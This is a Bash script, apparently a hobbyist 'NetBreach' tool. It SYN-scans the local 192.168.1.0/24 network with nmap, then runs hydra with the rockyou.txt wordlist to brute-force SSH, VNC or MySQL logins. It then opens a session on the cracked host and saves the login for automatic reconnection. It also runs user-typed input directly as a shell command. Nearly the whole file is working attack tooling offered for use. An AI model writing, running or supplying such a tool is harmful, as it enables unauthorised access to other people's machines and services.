#!/bin/bash

# file that hold all the variables that need for the program to work properly
source DontEdit.sh

# Function to handle cleanup on exit
# quits program with ctrl-c
EXIT_PROGRAM_WITH_CTRL_C() {
    echo -e "${RED}${BRIGHT}[-]${NC} EXITING SOFTWARE..."
    # Add cleanup commands here
    exit 1
}

# quits program with ctrl-z
EXIT_PROGRAM_WITH_CTRL_Z(){
    echo ""
    echo -e "${RED}${BRIGHT}[-]${NC} EXITING SOFTWARE..."
    # Add cleanup commands here
    exit 1
}

# Function to be executed when Ctrl+Z is pressed
handle_ctrl_z() {
    EXIT_PROGRAM_WITH_CTRL_Z
    exit 1
    # Your custom action goes here
}

# Set up the trap to call the function on SIGTSTP (Ctrl+Z)
trap 'handle_ctrl_z' SIGTSTP

# Function to handle Ctrl+C
ctrl_c() {
    echo ""
    EXIT_PROGRAM_WITH_CTRL_C
}

trap ctrl_c SIGINT

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Auto-connects the SSH server to the computer
if [[ "$1" == "--auto" ]]; then
    cat output.log

    # Check if the SSH connection file exists
    if [ -f "${ssh_connection}" ]; then
        userConnection=$(cat "${ssh_connection}")  # Read the hint from the file
        ssh "${userConnection}"  # Connect to the SSH server
    else
        # File not found
        echo -e "[ ${RED}${BRIGHT}Error${NC} ] SSH username and IP address file 'connect.log' not found."
        exit 1
    fi

    # Exit script successfully

    exit 1
fi

# Check if the user has put --skip in the arguments
if [[ "$1" == "--skip" ]]; then
    echo "Skipping package check"
    sleep 4

# Check if the user has put --skip-help in the arguments
elif [[ "$1" == "--skip-help" ]]; then
    xmessage -center -title "? HELP ?" "${HelpMessage}"
    exit 1

# Check if the user has put --help or -h in the arguments
elif [[ "$1" == "--help" || "$1" == "-h" ]]; then
    xmessage -center -title "? HELP ?" "${HelpMessage}"
    exit 1

else
    # Check for required packages
    for package in "${required_packages[@]}"; do
        if ! command_exists "${package}"; then
            echo ""
            xmessage -center -title "Missing Package" "[ FAIL ] The required package '${package}' is not installed. Please install it and try again."
            sleep 1 

            # Ask the user if they want to install the packages that are missing
            install=$(xmessage -buttons "Yes:0,No:1" -center -title "Install Packages?" "The required package '${package}' is missing. Would you like to install it?")
            if [[ "$?" -eq 0 ]]; then
                xmessage -center -title "Installing" "Installing required packages..."
                sleep 1
                bash requirements.sh
            else
                xmessage -center -title "Exiting" "You chose not to install the missing packages. Exiting."
                exit 1
            fi
        fi
    done
fi

# Check if root user
if [[ "${EUID}" -ne 0 ]]; then
    xmessage -center -title "[ FAIL ] "\
    "Please run as root."
    exit 1
fi

if [[ "$OSTYPE" == "${OS}"* ]]; then
    clear
    if [[ "${EUID}" -ne $root ]]; then
        # Error message if not running as root
        echo "${ERROR_MESSAGE}" >> ERROR.LOG
        xmessage -center -title "[ FAIL ]"\
        "${xmessage_error}"
        exit 1
    else
        sudo rm -rf hydra.restore
        clear

        #checks if the user is connected to the internet if they are not connceted it tells them they are not connceted and have to connect
        SITE="https://google.com/"
        if ! curl --head --silent --fail $SITE > /dev/null; then
            echo "ERROR:TIME:${CURRENT_TIME} Please connect to the internet. DATE:${CURRENT_DATE}" >> ERROR.LOG
            echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:${CURRENT_TIME} Please connect to the internet. DATE:${CURRENT_DATE}"

            exit 1
        else
            echo ""
        fi

        # Clear the terminal
        clear

        # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
        NetBreach() {
            # Display dialog input box and capture user input
            service=$(dialog --title "Port Selection-NetBreach" \
            --inputbox "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'.\nIf you want to stop the program, type 'stop'." 10 60 \
            3>&1 1>&2 2>&3)
            clear            
            if [[ "${service}" == "ALL" || "${service}" == "all" || "${service}" == "*" ]]; then
                # Tells the user that it can take up to an hour to complete the scanning process
                echo -e "${RED}This can take up to 1 hour to complete.${NC}"

                # Scan the entire network and display open ports
                sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
                echo "Scan complete. Open ports saved to scan.txt"
                # asks if the user want to see scan on a open file or not
                SeeFile=$(dialog --title "SEE-File" \
                --inputbox "Would you like to see the scan on a open file (Yes or No)" 10 60 \
                3>&1 1>&2 2>&3)
                clear
                if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                    echo "Opeing the scan file"
                    sleep 1
                    xdg-open scan.txt

                else
                    echo -e "Ok I will not open the scan.txt file"
                    sleep 1
                fi
                
                hydra -h >> HydraHelp.txt
                xdg-open HydraHelp.txt
                Hydra=$(dialog --title "Hydra" \
                --inputbox "Put in Hydra first to start the script." 10 60 \
                3>&1 1>&2 2>&3)

                if [[ " ${exit[*]} " == *" ${Hydra} "* ]]; then
                    echo "Goodbye"
                    exit 1
                else
                    $Hydra
                    exit 1
                fi

            # If the user asks what the program does, it goes to a function that helps them and explains what the program does
            elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
                echo "Stopping program..."
                sleep 1
                exit 1
            #checks if the user has put nothing into the input feild
            elif [[ " ${empty[*]} " == *" ${service} "* ]]; then
                echo -e "${RED}ERROR:${NC} plase input a number into the input field"
                sleep 1
                exit 1                
            #checks if the user has put in a letter insted of a number into the input feild
            for letter in "${alphabet[@]}"; do
                if [[ "${letter}" == "${service}" ]]; then
                    echo "Please enter a number next time"
                    exit 1
                fi
            done

            else
                # Scan specific port
                sudo nmap -sS 192.168.1.1/24 -p $service -oN $service.txt --open

                SeeFile=$(dialog --title "Nmap output" \
                --inputbox "Would you like to see the ${service} on a open file (Yes or No):" 10 60 \
                3>&1 1>&2 2>&3)
                #read -p "Would you like to see the ${service} on a open file (Yes or No): " SeeFile

                if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                    open "${service}.txt"
                else
                    echo -e "\n[ ${RED}${BRIGHT}-${NC} ] Ok I will not open the ${service}.txt file"
                    sleep 1
                fi
            fi
        }

        RunHackingCommand() {
            # Break in the outputs of my code
            echo
            # Services to crack the network
            xmessage -center -title "Services" "Services to crack the network: SSH - 22, VNC - 5900, MySQL - 3306"

            user=$(dialog --title "USER" \
            --inputbox "Input Username:" 10 60 \
            3>&1 1>&2 2>&3)
            clear

            host=$(dialog --title "HOST" \
            --inputbox "Input Hostname:" 10 60 \
            3>&1 1>&2 2>&3)
            clear
            
            port=$(dialog --title "PORT" \
            --inputbox "Input Port:" 10 60 \
            3>&1 1>&2 2>&3)
            clear

        }

        RunHackingCommandWithVNC() {
            if [[ $service == 5900 || $service == "VNC" ]]; then
                # Checks if the user has put anything in the 'Input Username' function and the hostname function
                # If not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" || $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    NetBreach
                # If the user inputs something in the 'Input Username' function and the hostname function,
                # it will continue as normal
                else
                    # Crack VNC password
                    hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
                    # Alerts the user that the computer is trying to connect to the VNC server
                    title="Connecting to ${GREEN}${host}${NC}"
                    Connecting_To_VNC_SERVER="We are connecting you to '${GREEN}${host}${NC}'. Please wait..."
                    echo -e "${title}"
                    echo -e "${Connecting_To_VNC_SERVER}"
                    sleep 5

                    # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                    # Notification for the user to see the computer is connected to the VNC server
                    title="Enter password to ${GREEN}${host}${NC}"
                    Connected_To_VNC_SERVER="We have connected you to '${GREEN}${host}${NC}'. Please enter the password to '${GREEN}${host}${NC}'. To continue..."
                    echo ""
                    echo "${title}"
                    echo "${Connected_To_VNC_SERVER}"
                    # Put the
                    echo
                    echo "Loading VNC server..."
                    open "vnc://${host}"
                    exit
                fi
            fi
        }

        RunHackingCommandWithSSH() {
            if [[ $service == 22 || $service == "ssh" ]]; then
                # Checks if the user has put anything in the 'Input Username' function and the hostname function
                # If not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    NetBreach
                # If the user inputs something in the 'Input Username' function and the hostname function,
                # it will continue as normal
                else

                    # Crack SSH password
                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                    # Alerts the user that the computer is trying to connect to the ssh server
                    title="Connecting to ${GREEN}${user}${NC}"
                    Connecting_To_SSH_SERVER="We are connecting you to ${GREEN}${user}${NC}. Please wait..."
                    echo ""
                    echo -e "${title}"
                    echo -e "${Connecting_To_SSH_SERVER}"
                    sleep 5

                    # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                    echo ""
                    title="Enter password to ${GREEN}${user}${NC}"
                    Connected_To_SSH_SERVER="We have connected you to ${GREEN}${user}${NC}. Please enter the password to ${GREEN}${user}${NC} to continue..."
                    echo ""
                    echo -e "${title}"
                    echo -e "${Connected_To_SSH_SERVER}"
                    echo ""
                    echo "${user}@${host}" > "${ssh_connection}"
                    sleep 1
                    ssh "${user}@${host}" -p "${port}"

                fi
            fi
        }

        RunHackingCommandWithMySQL() {
            if [[ $service == 3306 || $service == "mysql" ]]; then
                # Checks if the user has put anything in the 'Input Username' function and the hostname function
                # If not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    NetBreach
                # If the user inputs something in the 'Input Username' function and the hostname function,
                # it will continue as normal
                else
                    # Crack MySQL password
                    hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                    echo "Loading MySQL server..."
                    sleep 3
                    mysql -u "${user}" -p -A
                fi
            fi
        }
        NetBreach

        RunHackingCommand # Calls the RunHackingCommand function

        RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function

        RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function

        RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
    fi
else
    clear
    # Warning message for wrong OS
    echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
    echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
fi
